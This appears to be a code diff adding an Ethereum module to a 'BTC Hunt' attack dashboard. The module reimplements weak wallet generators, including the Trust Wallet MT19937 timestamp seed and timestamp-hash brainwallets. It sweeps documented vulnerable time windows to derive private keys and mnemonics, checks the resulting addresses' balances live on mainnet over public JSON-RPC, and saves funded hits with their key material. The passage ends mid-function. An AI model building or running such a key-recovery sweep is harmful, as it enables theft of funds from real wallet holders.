@@ -13,6 +13,7 @@ Deploy: gunicorn btc_hunt:app --bind 0.0.0.0:$PORT --timeout 180
 """
 
 import os, sys, io, re, csv, gzip, json, math, time, signal, base64, hmac, html
+import unicodedata
 import sqlite3, threading, hashlib, struct, argparse
 from pathlib import Path
 from datetime import datetime, timezone
@@ -172,6 +173,48 @@ RANDSTORM_MAX_TOTAL_MS  = max(RANDSTORM_MAX_MS,
                               _env_int("RANDSTORM_MAX_TOTAL_MS",
                                        4_000_000_000, 1000))
 _MS_PER_DAY = 86_400_000
+
+# ── Ethereum scanning ──────────────────────────────────────────────────────
+# Ethereum uses the same curve (secp256k1) but a different address hash
+# (Keccak-256) and has no local dataset: there is no bloom filter to probe, so
+# every derived candidate is checked live over JSON-RPC. That only works
+# because the requests are BATCHED (ETH_RPC_BATCH calls per HTTP POST).
+# Public MAINNET endpoints; set ETH_RPC_URLS to use your own node.
+# Public, keyless, rate-limited. Chosen from third-party measurements
+# (Oct 2026) of which endpoints still answer without a key: PublicNode, dRPC,
+# 1RPC and Flashbots Protect did; Ankr now needs a key and eth.llamarpc.com
+# returned 525/403. NOTHING here was reachable from the sandbox that shipped
+# this code, so /eth has a "Test RPC" button (POST /api/eth/ping) and
+# ETH_RPC_URLS overrides the whole list — your own node is the only sane choice
+# for a multi-million-candidate sweep.
+ETH_RPC_URLS_DEFAULT = ("https://ethereum-rpc.publicnode.com,"
+                        "https://eth.drpc.org,"
+                        "https://1rpc.io/eth,"
+                        "https://rpc.flashbots.net")
+_ETH_RPC_BASES = [u.strip().rstrip("/") for u in
+                  os.environ.get("ETH_RPC_URLS", ETH_RPC_URLS_DEFAULT).split(",")
+                  if u.strip()] or [u.strip().rstrip("/")
+                                    for u in ETH_RPC_URLS_DEFAULT.split(",")]
+ETH_RPC_BATCH   = _env_int("ETH_RPC_BATCH", 50, 1)
+ETH_RPC_TIMEOUT = max(1.0, _env_float("ETH_RPC_TIMEOUT", 25))
+# Minimum wei to save a hit. 1 (default) skips empty addresses; 0 keeps every
+# verified candidate, including never-used ones — a timestamp sweep then writes
+# one row per timestamp, so for big runs keep this at 1 rather than lowering it.
+# Set ETH_VERIFY_BALANCES=0 to derive without checking: nothing is queried and
+# nothing is saved, candidates are only counted as "unchecked".
+ETH_MIN_WEI     = _env_int("ETH_MIN_WEI", 1, 0)
+ETH_VERIFY_BALANCES = os.environ.get(
+    "ETH_VERIFY_BALANCES", "1").strip().lower() not in ("0", "false", "no", "off")
+# Timestamp-step caps, mirroring RANDSTORM_MAX_MS / RANDSTORM_MAX_TOTAL_MS.
+# One "step" is one timestamp in the selected unit (ms or s).
+ETH_MAX_STEPS       = max(1000, _env_int("ETH_MAX_STEPS", 5_000_000, 1000))
+ETH_MAX_TOTAL_STEPS = max(ETH_MAX_STEPS,
+                          _env_int("ETH_MAX_TOTAL_STEPS", 20_000_000, 1000))
+ETH_MAX_WEAK_KEYS   = _env_int("ETH_MAX_WEAK_KEYS", 2_000_000, 1)
+# BIP-39 English wordlist (vendored from bitcoin/bips, sha256 2f5eed53…).
+BIP39_WORDLIST_PATH = Path(os.environ.get(
+    "BIP39_WORDLIST_PATH",
+    str(Path(__file__).resolve().parent / "data" / "bip39_english.txt")))
 PORT       = int(os.environ.get("PORT", 5000))
 GENESIS_TS = 1293840000000  # 2011-01-01 ms
 CUTOFF_TS  = 1420070400000  # 2015-01-01 ms
@@ -1333,21 +1376,28 @@ def _esplora_rate_ok(base=None):
             _RATE_INTERVAL[0] = max(ESPLORA_MIN_INTERVAL,
                                     _RATE_INTERVAL[0] * 0.8)
 
-def _esplora_ready():
-    """Bases that are not cooling down right now."""
+def _esplora_ready(bases=None):
+    """Bases that are not cooling down right now.
+
+    `bases` defaults to the Esplora list; the Ethereum RPC client passes its
+    own. The cooldown table is keyed by URL, so both share one politeness
+    budget for pacing while parking endpoints independently.
+    """
+    bases = _ESPLORA_BASES if bases is None else bases
     now = time.monotonic()
     with _RATE_LOCK:
-        return [b for b in _ESPLORA_BASES if _BASE_COOL.get(b, 0.0) <= now]
+        return [b for b in bases if _BASE_COOL.get(b, 0.0) <= now]
 
-def _esplora_wait_for_base(should_stop=None):
+def _esplora_wait_for_base(should_stop=None, bases=None):
     """Block (Stop-aware) until at least one endpoint is out of cooldown."""
+    bases = _ESPLORA_BASES if bases is None else bases
     while True:
-        ready = _esplora_ready()
+        ready = _esplora_ready(bases)
         if ready:
             return ready
         now = time.monotonic()
         with _RATE_LOCK:
-            left = min(_BASE_COOL.get(b, 0.0) - now for b in _ESPLORA_BASES)
+            left = min(_BASE_COOL.get(b, 0.0) - now for b in bases)
         _esplora_sleep(min(max(left, 0.0), ESPLORA_MAX_BACKOFF_SECS),
                        should_stop)
 
@@ -1359,12 +1409,13 @@ def _esplora_pick(ready, avoid=None):
                 return b
     return ready[0]
 
-def _esplora_status():
+def _esplora_status(bases=None):
     """One-line per-endpoint state for the log and the /results page."""
+    bases = _ESPLORA_BASES if bases is None else bases
     now = time.monotonic()
     with _RATE_LOCK:
         parts = []
-        for b in _ESPLORA_BASES:
+        for b in bases:
             left = _BASE_COOL.get(b, 0.0) - now
             parts.append(f"{_esplora_host(b)}: cooling {left:.0f}s"
                          if left > 0 else f"{_esplora_host(b)}: ok")
@@ -1735,7 +1786,8 @@ def attack_nonce_reuse_bulk(addresses, log, job):
 # ════════════════════════════════════════════════════════════════════
 _JOBS = {}
 _JOBS_LOCK = threading.Lock()
-JOB_NAMES = ("dataset", "randstorm", "brainwallet", "nonce", "verify")
+JOB_NAMES = ("dataset", "randstorm", "brainwallet", "nonce", "verify",
+             "eth_ts", "eth_weak", "eth_verify")
 
 _HITS_FILE = None  # set in worker mode: append-only JSONL of hits
 
@@ -1825,6 +1877,21 @@ def _balance_badge(addr, checks):
     if v["error"]:
         return ('<span class="badge warn">check failed: '
                 + html.escape(str(v["error"])[:120]) + '</span>')
+    if str(addr).startswith("0x"):
+        # ETH rows reuse the same table with a documented convention:
+        # sats = whole gwei, mempool_sats = remaining wei, tx_count = nonce.
+        wei = v["sats"] * 10 ** 9 + v["mempool_sats"]
+        if wei > 0:
+            # The nonce matters here: it says the account has actually sent a
+            # transaction, so a balance is not just an untouched deposit.
+            return (f'<span class="badge ok">{wei / 1e18:.6f} ETH · nonce '
+                    f'{v["tx_count"]:,} — verify manually with a block '
+                    'explorer</span>')
+        if v["tx_count"] == 0:
+            return ('<span class="badge bad">0 ETH · nonce 0 — no outgoing '
+                    'tx ever, likely never used</span>')
+        return (f'<span class="badge bad">0 ETH · nonce {v["tx_count"]:,} — '
+                'used and emptied</span>')
     total = v["sats"] + v["mempool_sats"]
     if total > 0:
         return (f'<span class="badge ok">{total/1e8:.8f} BTC — '
@@ -2188,7 +2255,7 @@ def health():
     # git commit this process started from — compare it with the latest commit
     # on main to check whether an auto-pull deploy actually took effect.
     return {"status": "ok", "build": BUILD_ID, "started": STARTED_AT,
-            "ec": EC_BACKEND}
+            "ec": EC_BACKEND, "keccak": ETH_HASH_BACKEND}
 
 PAGE = """
 <!doctype html><html><head><meta charset="utf-8">
@@ -2217,6 +2284,13 @@ font-weight:bold;border:1px solid}
 .badge.ok{background:#2e3b2b;color:#a3be8c;border-color:#a3be8c}
 .badge.bad{background:#3b2629;color:#bf616a;border-color:#bf616a}
 .badge.warn{background:#3b3326;color:#ebcb8b;border-color:#ebcb8b}
+select{background:#2e3440;color:#d8dee9;border:1px solid #4c566a;padding:8px;
+border-radius:4px;width:100%;font-family:inherit;margin:4px 0}
+.recipes{display:grid;gap:6px;margin:6px 0}
+label.rec{border:1px solid #3b4252;border-radius:6px;padding:8px;background:#141a21;
+color:#d8dee9;font-size:13px;margin-top:0}
+label.rec input{width:auto;margin:0 6px 0 0;vertical-align:middle}
+label.rec b{color:#88c0d0}
 .muted{color:#7b8794;font-size:13px}
 .status-ok{color:#a3be8c}.status-bad{color:#bf616a}
 .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:12px}
@@ -2256,12 +2330,13 @@ function killAll(){
     if(d.ok && !d.restarting) location.reload();
   });
 }
-function watch(name){
+function watch(name, sfx){
+  sfx=sfx||'';
   let since=0, lines=[], delay=1000;
   const NL=String.fromCharCode(10);
-  const bar=document.getElementById('bar'),
-        detail=document.getElementById('detail'),
-        log=document.getElementById('log');
+  const bar=document.getElementById('bar'+sfx),
+        detail=document.getElementById('detail'+sfx),
+        log=document.getElementById('log'+sfx);
   function tick(){
     fetch('/api/job/'+encodeURIComponent(name)+'?since='+since,{cache:'no-store'})
       .then(r=>{ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
@@ -2290,7 +2365,8 @@ function watch(name){
 <h1>₿ BTC Hunt — pre-2015 attack dashboard</h1>
 <p><a href="/">home</a><a href="/data">dataset</a>
 <a href="/randstorm">randstorm</a><a href="/brain">brainwallet</a>
-<a href="/nonce">nonce reuse</a><a href="/results">results</a>
+<a href="/nonce">nonce reuse</a><a href="/eth">ethereum</a>
+<a href="/results">results</a>
 <button class="btn danger" style="float:right;padding:4px 10px;font-size:12px" onclick="killAll()">Kill all jobs</button></p>
 <hr style="border-color:#3b4252;margin:14px 0">
 <div id="msg" class="msg"></div>
@@ -2335,7 +2411,7 @@ def home():
 <div class="card"><h2>Jobs</h2>
 <p id="jobs-summary" class="muted">checking…</p>
 <p class="muted">The header <b>Kill all jobs</b> button stops dataset,
-Randstorm, brainwallet, nonce-reuse and balance-check jobs at once, clears the
+Randstorm, brainwallet, nonce-reuse, Ethereum and balance-check jobs at once, clears the
 auto-deploy marker and restarts the Gunicorn worker for a clean slate. Saved
 hits, the Bloom filter and the cached .gz are <b>not</b> deleted.</p>
 </div>
@@ -2355,6 +2431,12 @@ weak ones.</p>
 algebraically. Scan one address or upload a .txt list of thousands via
 Blockstream Esplora; hits are stored in SQLite.</p>
 <a class="btn" href="/nonce">Open</a></div>
+<div class="card"><h2>4. Ethereum</h2>
+<p class="muted">Same curve, Keccak-256 addresses, no bloom: derived
+candidates are checked live over batched JSON-RPC. Timestamp sweeps
+(seconds or ms) for weak generators such as the Trust Wallet
+Mersenne-Twister seed, plus sequential/weak private keys.</p>
+<a class="btn" href="/eth">Open</a></div>
 </div>
 <script>
 function refreshJobs(){{
@@ -2687,7 +2769,9 @@ def results_page():
              "save-candidate-first behaviour.</p>")
     body += ("<p><a class='btn' href='/api/results/export'>Download all (JSONL)</a>"
              "<a class='btn' href='/api/results/export?attack=nonce'>"
-             "Download nonce results (JSONL)</a></p>"
+             "Download nonce results (JSONL)</a>"
+             "<a class='btn' href='/api/results/export?attack=eth'>"
+             "Download Ethereum results (JSONL)</a></p>"
              "<p class='muted'>The page shows the newest 500 hits; "
              "the downloads contain all of them.</p>")
     body += ("<div class='card'><h2>Check balances</h2>"
@@ -2710,6 +2794,17 @@ def results_page():
              f"<p class='muted'>Endpoints now: {html.escape(_esplora_status())}</p>"
              "<div class='bar'><div id='bar' style='width:0%'></div></div>"
              "<p id='detail' class='muted'></p><pre id='log'></pre></div>")
+    body += ("<div class='card'><h2>Check ETH balances</h2>"
+             "<button class='btn' onclick=\"post('/api/eth/verify',{})\">"
+             "Check ETH balances</button>"
+             "<button class='btn danger' onclick=\"stop('eth_verify')\">"
+             "Stop</button>"
+             f"<p class='muted'>Re-checks every saved 0x address over JSON-RPC "
+             f"in batches of {ETH_RPC_BATCH} addresses, with per-endpoint 429 "
+             "failover and retry passes. Rows store gwei + the wei remainder "
+             "and the nonce, so 0 ETH with nonce 0 reads as never used.</p>"
+             "<div class='bar'><div id='barEth' style='width:0%'></div></div>"
+             "<p id='detailEth' class='muted'></p><pre id='logEth'></pre></div>")
     if not rows:
         body += "<p class='muted'>no hits yet</p>"
     funded = never_funded = unchecked = 0
@@ -2746,6 +2841,7 @@ def results_page():
     body += ("<script>\n"
              "function verifyBalances(force){ post('/api/verify',{force:!!force}); }\n"
              "watch('verify');\n"
+             "watch('eth_verify','Eth');\n"
              "</script>")
     return page(body)
 
@@ -2783,7 +2879,10 @@ def api_results_export():
     attack = (request.args.get("attack") or "").strip()
     q = "SELECT attack,payload,ts FROM results"
     args = ()
-    if attack:
+    if attack == "eth":
+        # Ethereum hits are bucketed per recipe (eth_tw_bip39_s, eth_weakkey…)
+        q += " WHERE attack LIKE 'eth%'"
+    elif attack:
         q += " WHERE attack = ?"
         args = (attack,)
     q += " ORDER BY id ASC"
@@ -2921,6 +3020,1122 @@ def _shard_range(start, end, idx, n):
     return s, e
 
 
+
+# ════════════════════════════════════════════════════════════════════
+# ATTACK 4 — ETHEREUM (timestamp sweeps + weak keys, live RPC balances)
+# ════════════════════════════════════════════════════════════════════
+# Same curve as Bitcoin (secp256k1) — so the EC backend from the Randstorm work
+# is reused as-is — but a different address hash and, crucially, no local
+# dataset: there is no bloom filter of funded Ethereum addresses to probe.
+# The scan is therefore inverted. Derive candidates cheaply, then ask the chain
+# about a whole BATCH of them per HTTP request (ETH_RPC_BATCH addresses, two
+# calls each: eth_getBalance + eth_getTransactionCount).
+#
+# A TIMESTAMP IS A SEED, NEVER A KEY. Exactly as with Randstorm, each recipe
+# below reproduces a specific broken generator and declares the unit (seconds
+# or milliseconds) that generator was fed. Sweeping `privkey = 1405987200000`
+# directly is the `raw` recipe and is included only because people really did
+# it — it is not how any of these wallets were made.
+
+# ── Keccak-256 ──────────────────────────────────────────────────────────
+# Ethereum uses the ORIGINAL Keccak padding (domain byte 0x01), not NIST
+# SHA3-256 (0x06), so hashlib's sha3_256 is the wrong function. Verified
+# against keccak256("") = c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7b
+# fad8045d85a470 and keccak256("abc")/keccak256("testing").
+_M64 = 0xFFFFFFFFFFFFFFFF
+
+
+def _rol64(a, n):
+    n %= 64
+    return a if n == 0 else ((a << n) | (a >> (64 - n))) & _M64
+
+
+def _keccak_f1600(A):
+    # The round-constant LFSR must persist across all 24 rounds; resetting it
+    # per round silently produces a different (wrong) hash.
+    R = 1
+    for _ in range(24):
+        C = [A[x][0] ^ A[x][1] ^ A[x][2] ^ A[x][3] ^ A[x][4] for x in range(5)]
+        D = [C[(x + 4) % 5] ^ _rol64(C[(x + 1) % 5], 1) for x in range(5)]
+        for x in range(5):
+            for y in range(5):
+                A[x][y] ^= D[x]
+        x, y = 1, 0
+        cur = A[x][y]
+        for t in range(24):
+            x, y = y, (2 * x + 3 * y) % 5
+            cur, A[x][y] = A[x][y], _rol64(cur, (t + 1) * (t + 2) // 2)
+        for y in range(5):
+            T = [A[x][y] for x in range(5)]
+            for x in range(5):
+                A[x][y] = T[x] ^ ((~T[(x + 1) % 5]) & T[(x + 2) % 5])
+        for j in range(7):
+            R = ((R << 1) ^ ((R >> 7) * 0x71)) % 256
+            if R & 2:
+                A[0][0] ^= 1 << ((1 << j) - 1)
+    return A
+
+
+def _keccak256_py(data):
+    """Pure-Python Keccak-256 (~400 us per 64-byte hash)."""
+    rate = 136                                   # 1088-bit rate
+    st = [[0] * 5 for _ in range(5)]
+    buf = bytearray(data) + b"\x01"
+    while len(buf) % rate:
+        buf.append(0)
+    buf[-1] |= 0x80
+    for off in range(0, len(buf), rate):
+        blk = buf[off:off + rate]
+        for i in range(rate // 8):
+            st[i % 5][i // 5] ^= struct.unpack_from("<Q", blk, 8 * i)[0]
+        st = _keccak_f1600(st)
+    out = b"".join(struct.pack("<Q", st[j][i])
+                   for i in range(5) for j in range(5))
+    return out[:32]
+
+
+try:                                   # optional native acceleration (~117x)
+    from Crypto.Hash import keccak as _pycryptodome_keccak
+    import Crypto as _pycryptodome
+
+    def _keccak256_native(data):
+        h = _pycryptodome_keccak.new(digest_bits=256)
+        h.update(data)
+        return h.digest()
+except Exception:
+    _pycryptodome_keccak = None
+    _pycryptodome = None
+    _keccak256_native = None
+
+keccak256 = _keccak256_native or _keccak256_py
+ETH_HASH_BACKEND = (
+    "pycryptodome %s" % getattr(_pycryptodome, "__version__", "?")
+    if _keccak256_native else "python keccak-f1600 (~400 us/hash)")
+
+
+# ── Mersenne Twister (MT19937) ───────────────────────────────────────────
+class _MT19937:
+    """Reference init_genrand MT19937.
+
+    Verified: seed 5489 yields 3499211612, 581869302, 3890346734, 3586334585,
+    545404204 — the published test vector. This is the generator shape behind
+    the Trust Wallet browser-extension bug, where it was seeded with a Unix
+    timestamp in SECONDS instead of a CSPRNG.
+    """
+
+    def __init__(self, seed):
+        mt = [0] * 624
+        mt[0] = seed & 0xFFFFFFFF
+        for i in range(1, 624):
+            mt[i] = (1812433253 * (mt[i - 1] ^ (mt[i - 1] >> 30)) + i) & 0xFFFFFFFF
+        self.mt = mt
+        self.idx = 624
+
+    def _twist(self):
+        mt = self.mt
+        for i in range(624):
+            y = (mt[i] & 0x80000000) + (mt[(i + 1) % 624] & 0x7FFFFFFF)
+            mt[i] = mt[(i + 397) % 624] ^ (y >> 1)
+            if y & 1:
+                mt[i] ^= 2567483615
+        self.idx = 0
+
+    def int32(self):
+        if self.idx >= 624:
+            self._twist()
+        y = self.mt[self.idx]
+        self.idx += 1
+        y ^= y >> 11
+        y ^= (y << 7) & 2636928640
+        y ^= (y << 15) & 4022730752
+        y ^= y >> 18
+        return y & 0xFFFFFFFF
+
+
+# ── BIP-39 / BIP-32 ─────────────────────────────────────────────────────
+_BIP39_WORDS = None
+_BIP39_LOCK = threading.Lock()
+_ETH_PATH = (0x80000000 + 44, 0x80000000 + 60, 0x80000000, 0, 0)
+
+
+def _bip39_words():
+    """The 2048-word BIP-39 English list, loaded once (vendored data file)."""
+    global _BIP39_WORDS
+    with _BIP39_LOCK:
+        if _BIP39_WORDS is None:
+            words = BIP39_WORDLIST_PATH.read_text(encoding="utf-8").split()
+            if len(words) != 2048:
+                raise RuntimeError(
+                    "BIP-39 wordlist must hold 2048 words, found %d in %s"
+                    % (len(words), BIP39_WORDLIST_PATH))
+            _BIP39_WORDS = words
+        return _BIP39_WORDS
+
+
+def bip39_mnemonic(entropy):
+    """16 bytes of entropy -> the 12-word sentence (4-bit SHA-256 checksum).
+
+    Verified: 16 zero bytes -> "abandon abandon ... about".
+    """
+    words = _bip39_words()
+    bits = "".join(format(x, "08b") for x in entropy)
+    bits += "".join(format(x, "08b")
+                    for x in hashlib.sha256(entropy).digest())[:len(entropy) // 4]
+    return " ".join(words[int(bits[i:i + 11], 2)] for i in range(0, len(bits), 11))
+
+
+def bip39_seed(mnemonic, passphrase=""):
+    """PBKDF2-HMAC-SHA512, 2048 rounds, salt "mnemonic"+passphrase (NFKD).
+
+    Verified against the BIP-39 "TREZOR" vector.
+    """
+    pw = unicodedata.normalize("NFKD", mnemonic).encode("utf-8")
+    salt = unicodedata.normalize("NFKD", "mnemonic" + passphrase).encode("utf-8")
+    return hashlib.pbkdf2_hmac("sha512", pw, salt, 2048, 64)
+
+
+def bip32_master(seed):
+    I = hmac.new(b"Bitcoin seed", seed, hashlib.sha512).digest()
+    return int.from_bytes(I[:32], "big"), I[32:]
+
+
+def _ser_pub(k):
+    x, y = _ec_point(k)
+    return b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")
+
+
+def bip32_ckd_priv(k, cc, index):
+    """One BIP-32 private child derivation (hardened when index >= 2**31).
+
+    Verified against BIP-32 test vector 1 (m and m/0H).
+    """
+    if index >= 0x80000000:
+        data = b"\x00" + k.to_bytes(32, "big") + struct.pack(">I", index)
+    else:
+        data = _ser_pub(k) + struct.pack(">I", index)
+    I = hmac.new(cc, data, hashlib.sha512).digest()
+    il = int.from_bytes(I[:32], "big")
+    child = (il + k) % N
+    if il >= N or child == 0:
+        raise ValueError("invalid BIP-32 child key")
+    return child, I[32:]
+
+
+def eth_account_from_seed(seed, path=_ETH_PATH):
+    """The m/44'/60'/0'/0/0 private key of a BIP-39 seed."""
+    k, cc = bip32_master(seed)
+    for index in path:
+        k, cc = bip32_ckd_priv(k, cc, index)
+    return k
+
+
+# ── Ethereum addresses ──────────────────────────────────────────────────
+_ETH_ADDR_RE = re.compile(r"^0x[0-9a-fA-F]{40}$")
+
+
+def eth_address_bytes(privkey):
+    """keccak256(uncompressed pubkey without the 0x04 prefix)[-20:]."""
+    k = privkey % N
+    if k == 0:
+        return None
+    pt = _ec_point(k)
+    if pt is None:
+        return None
+    return keccak256(pt[0].to_bytes(32, "big") + pt[1].to_bytes(32, "big"))[-20:]
+
+
+def eth_address(privkey):
+    """EIP-55 mixed-case checksummed address (verified for keys 1, 2, 3)."""
+    h = eth_address_bytes(privkey)
+    if h is None:
+        return None
+    hx = h.hex()
+    up = keccak256(hx.encode("ascii")).hex()
+    return "0x" + "".join(c.upper() if int(up[i], 16) >= 8 else c
+                          for i, c in enumerate(hx))
+
+
+# ── Recipes: which broken generator a timestamp is fed into ──────────────
+def _r_raw(value, unit):
+    k = value % N
+    return [(k, {"recipe_input": value})] if k else []
+
+
+def _r_sha256_dec(value, unit):
+    k = int.from_bytes(hashlib.sha256(str(value).encode("ascii")).digest(),
+                       "big") % N
+    return [(k, {"recipe_input": value})] if k else []
+
+
+def _r_sha256_be8(value, unit):
+    k = int.from_bytes(hashlib.sha256(value.to_bytes(8, "big")).digest(),
+                       "big") % N
+    return [(k, {"recipe_input": value})] if k else []
+
+
+def _r_keccak_dec(value, unit):
+    k = int.from_bytes(keccak256(str(value).encode("ascii")), "big") % N
+    return [(k, {"recipe_input": value})] if k else []
+
+
+def _r_mt19937_s(value, unit):
+    seed32 = value & 0xFFFFFFFF
+    mt = _MT19937(seed32)
+    raw = b"".join(struct.pack(">I", mt.int32()) for _ in range(8))
+    k = int.from_bytes(raw, "big") % N
+    return [(k, {"mt_seed": seed32})] if k else []
+
+
+def _r_tw_bip39_s(value, unit):
+    """Trust Wallet Extension v2.68 class: MT19937 seeded with Unix SECONDS,
+    first four 32-bit outputs used as 16 bytes of BIP-39 entropy, then
+    m/44'/60'/0'/0/0.
+
+    The MT/BIP-39/BIP-32 layers each match their published test vectors, but
+    the exact order in which the vulnerable library consumed MT output is not
+    publicly documented, so treat a miss as "this recipe shape did not match",
+    not as proof that a wallet in the window is safe.
+    """
+    seed32 = value & 0xFFFFFFFF
+    mt = _MT19937(seed32)
+    entropy = b"".join(struct.pack(">I", mt.int32()) for _ in range(4))
+    mnemonic = bip39_mnemonic(entropy)
+    k = eth_account_from_seed(bip39_seed(mnemonic))
+    return [(k, {"mt_seed": seed32, "entropy": entropy.hex(),
+                 "mnemonic": mnemonic, "path": "m/44'/60'/0'/0/0"})] if k else []
+
+
+ETH_RECIPES = {
+    "tw_bip39_s": {
+        "label": "Trust Wallet MT19937 → BIP-39 → m/44'/60'/0'/0/0",
+        "units": ("s",), "default": True, "fn": _r_tw_bip39_s,
+        "note": "MT19937 seeded with the Unix timestamp in SECONDS, first 4 "
+                "outputs used as 12-word mnemonic entropy. This is the shape "
+                "of the Trust Wallet browser-extension bug (v2.68, wallets "
+                "created 2022-11-24 → 2022-12-22). ~2.7 ms per candidate "
+                "(PBKDF2-2048 dominates), so the 2,505,600-second window "
+                "takes ~2 h."},
+    "sha256_dec": {
+        "label": "sha256(decimal timestamp)",
+        "units": ("ms", "s"), "default": True, "fn": _r_sha256_dec,
+        "note": "The classic timestamp brainwallet: privkey = "
+                "sha256(str(timestamp)). Common in 2015-era scripts and "
+                "tutorial code."},
+    "keccak_dec": {
+        "label": "keccak256(decimal timestamp)",
+        "units": ("ms", "s"), "default": False, "fn": _r_keccak_dec,
+        "note": "The Ethereum-native variant of the same brainwallet idea."},
+    "sha256_be8": {
+        "label": "sha256(8-byte big-endian timestamp)",
+        "units": ("ms", "s"), "default": False, "fn": _r_sha256_be8,
+        "note": "Binary instead of decimal input; what a program that hashed "
+                "the raw integer would produce."},
+    "mt19937_s": {
+        "label": "MT19937(seconds) → first 32 bytes as the key",
+        "units": ("s",), "default": False, "fn": _r_mt19937_s,
+        "note": "Raw Mersenne-Twister output used directly as a private key "
+                "(no BIP-39 layer). Much faster than the mnemonic recipe."},
+    "raw": {
+        "label": "the timestamp itself as the key",
+        "units": ("ms", "s"), "default": False, "fn": _r_raw,
+        "note": "privkey = timestamp. Included because early users really did "
+                "this, not because any library generated keys this way."},
+}
+
+# Documented windows, for the preset buttons. Values are exact UTC epochs.
+ETH_PRESETS = [
+    {"id": "tw", "unit": "s", "start": 1669248000, "end": 1671753599,
+     "label": "Trust Wallet ext v2.68 (2022-11-24 → 2022-12-22)",
+     "note": "2,505,600 one-second seeds. The real timestamp-seeded Ethereum "
+             "window; use with the tw_bip39_s / mt19937_s recipes."},
+    {"id": "frontier", "unit": "ms", "start": 1438214400000, "end": 1451606399000,
+     "label": "Frontier era (2015-07-30 → 2015-12-31)",
+     "note": "Weak/brainwallet key generation in the first months of Ethereum. "
+             "13.4 billion ms timestamps — sweep a slice, not the whole thing."},
+    {"id": "cryptojs", "unit": "s", "start": 1514764800, "end": 1577836799,
+     "label": "CryptoJS < 4.2 era (2018 → 2020)",
+     "note": "Wallets whose entropy came from CryptoJS's Math.random-based "
+             "WordArray.random. NOTE: recovering those needs the browser "
+             "PRNG state, not a timestamp sweep — a timestamp recipe will only "
+             "find keys that were also seeded from the clock."},
+    {"id": "presale", "unit": "ms", "start": 1405987200000, "end": 1409702399000,
+     "label": "2014 presale (2014-07-22 → 2014-09-02)",
+     "note": "CAUTION: presale private keys were generated with a real CSPRNG. "
+             "The documented weakness is in the ENCRYPTED KEYSTORE (weak "
+             "password / IV), so a private-key timestamp sweep will not "
+             "recover a presale wallet. Kept here only so the window is not "
+             "mistaken for a scannable one."},
+]
+
+_range_chunks = _randstorm_chunks        # generic inclusive chunker
+
+
+# ── JSON-RPC client: batching, pacing, per-endpoint 429 cooldown ─────────
+_ETH_HEADERS = {"Content-Type": "application/json", "Accept": "application/json"}
+_ETH_BATCH_OK = {}          # base -> bool; some public endpoints refuse batches
+
+
+def _eth_headers():
+    h = dict(_ETH_HEADERS)
+    h["User-Agent"] = _esplora_headers().get("User-Agent", "btc-hunt")
+    return h
+
+
+def _eth_call_batch(calls, should_stop=None):
+    """POST JSON-RPC `calls`; return (results_aligned_with_input, base_used).
+
+    Tries one batch request first. An endpoint that answers a batch with a
+    single object is remembered and gets one request per call instead. 429/5xx
+    parks that endpoint (per-endpoint cooldown, shared with the Esplora client)
+    and fails over to the next one.
+    """
+    ids = [c["id"] for c in calls]
+    batch = len(calls) > 1
+    last_err = None
+    failed_base = None
+    for _attempt in range(ESPLORA_MAX_RETRIES + 1):
+        if should_stop and should_stop():
+            raise RuntimeError("stopped by user")
+        ready = _esplora_wait_for_base(should_stop, _ETH_RPC_BASES)
+        base = _esplora_pick(ready, failed_base)
+        if batch and not _ETH_BATCH_OK.get(base, True):
+            out = []
+            for c in calls:
+                res, _b = _eth_call_batch([c], should_stop)
+                out.append(res[0])
+            return out, base
+        _esplora_pace(should_stop)
+        try:
+            r = requests.post(base, json=(calls if batch else calls[0]),
+                              timeout=ETH_RPC_TIMEOUT, headers=_eth_headers())
+            if r.status_code == 429 or r.status_code >= 500:
+                cool = _esplora_throttled(base, r)
+                failed_base = base
+                last_err = _EsploraRateLimited(
+                    "HTTP %d from %s — cooling %.0fs"
+                    % (r.status_code, _esplora_host(base), cool))
+                continue
+            r.raise_for_status()
+            data = r.json()
+        except _EsploraRateLimited:
+            raise
+        except RuntimeError as e:
+            if "stopped by user" in str(e):
+                raise
+            failed_base = base
+            last_err = e
+            continue
+        except Exception as e:
+            failed_base = base
+            last_err = e
+            continue
+        _esplora_rate_ok(base)
+        if batch:
+            if not isinstance(data, list):
+                _ETH_BATCH_OK[base] = False        # refused the batch: retry
+                last_err = RuntimeError("endpoint refused the batch request")
+                continue
+            by_id = {item.get("id"): item for item in data
+                     if isinstance(item, dict)}
+            return [by_id.get(i) for i in ids], base
+        return [data if isinstance(data, dict) else None], base
+    if isinstance(last_err, _EsploraRateLimited):
+        raise last_err
+    raise RuntimeError("Ethereum RPC failed after %d attempt(s): %s"
+                       % (ESPLORA_MAX_RETRIES + 1, last_err))
+
+
+def _eth_balances(addresses, should_stop=None):
+    """{address: {"wei": int, "nonce": int, "error": str}} for one batch.
+
+    Two calls per address: eth_getBalance and eth_getTransactionCount. The
+    nonce is what distinguishes "never used" from "funded then emptied", the
+    same distinction tx_count gives on the Bitcoin side.
+    """
+    out = {a: {"wei": 0, "nonce": 0, "error": ""} for a in addresses}
+    if not addresses:
+        return out
+    calls = []
+    for i, a in enumerate(addresses):
+        calls.append({"jsonrpc": "2.0", "id": "b%d" % i,
+                      "method": "eth_getBalance", "params": [a, "latest"]})
+        calls.append({"jsonrpc": "2.0", "id": "n%d" % i,
+                      "method": "eth_getTransactionCount", "params": [a, "latest"]})
+    res, _base = _eth_call_batch(calls, should_stop)
+    for i, a in enumerate(addresses):
+        bal = res[2 * i] if res and len(res) > 2 * i else None
+        non = res[2 * i + 1] if res and len(res) > 2 * i + 1 else None
+        try:
+            if not isinstance(bal, dict) or "result" not in bal:
+                err = (bal or {}).get("error") if isinstance(bal, dict) else None
+                out[a]["error"] = ("RPC error: %s" % json.dumps(err)[:160]
+                                   if err else "no balance result")[:200]
+                continue
+            out[a]["wei"] = int(bal["result"], 16)
+            if isinstance(non, dict) and "result" in non:
+                out[a]["nonce"] = int(non["result"], 16)
+        except Exception as e:
+            out[a]["error"] = str(e)[:200]
+    return out
+
+
+def _store_eth_check(addr, wei, nonce, error=""):
+    """ETH rows reuse balance_checks: sats = whole gwei, mempool_sats = the
+    remaining wei (so wei is reconstructable exactly), tx_count = nonce."""
+    gwei, rem = divmod(int(wei), 10 ** 9)
+    _store_balance_check(addr, gwei, int(nonce), rem, error)
+
+
+def _eth_verdict(wei, nonce):
+    if wei > 0:
+        return "funded_verify_manually"
+    if nonce == 0:
+        return "never_used_likely_never_funded"
